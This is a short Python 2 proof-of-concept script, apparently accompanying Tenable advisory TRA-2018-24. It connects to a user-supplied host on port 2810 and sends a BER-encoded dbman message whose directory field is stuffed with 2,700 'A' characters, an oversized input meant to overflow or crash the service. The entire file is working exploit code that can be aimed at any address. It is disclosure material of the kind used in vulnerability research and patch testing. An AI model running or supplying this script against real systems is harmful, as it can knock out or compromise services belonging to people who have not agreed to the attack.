from pyasn1.type.univ import *
from pyasn1.type.namedtype import *
from pyasn1.codec.ber import encoder
import struct
import binascii
import socket, sys

# http://tenable.com/security/research/tra-2018-24

def print_usage():
    print "Usage: python " + sys.argv[0] + " <ip> [port=2810]"
    sys.exit(0)

port = 2810	# default
opcode = 10001

num_args = len(sys.argv)
if num_args < 2 or num_args > 3:
    print_usage()

ip = sys.argv[1]
if num_args == 3:
    try:
        port = int(sys.argv[2])
    except:
        print "Invalid port number."
        print_usage()

print "Running PoC against " + ip + ":" + str(port)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))

class DbmanMsg(Sequence):
    componentType = NamedTypes(
        NamedType('flag', Integer()),
        NamedType('curDir', OctetString())
    )

msg = DbmanMsg()

msg['flag'] = 1
msg['curDir'] = "A"*2700

encodedMsg = encoder.encode(msg, defMode=True)
msgLen = len(encodedMsg)
values = (opcode, msgLen, encodedMsg)
s = struct.Struct(">ii%ds" % msgLen)
packed_data = s.pack(*values)

print "Length of encoded message: " + str(msgLen)
sock.send(packed_data)
sock.close()

print "Done."
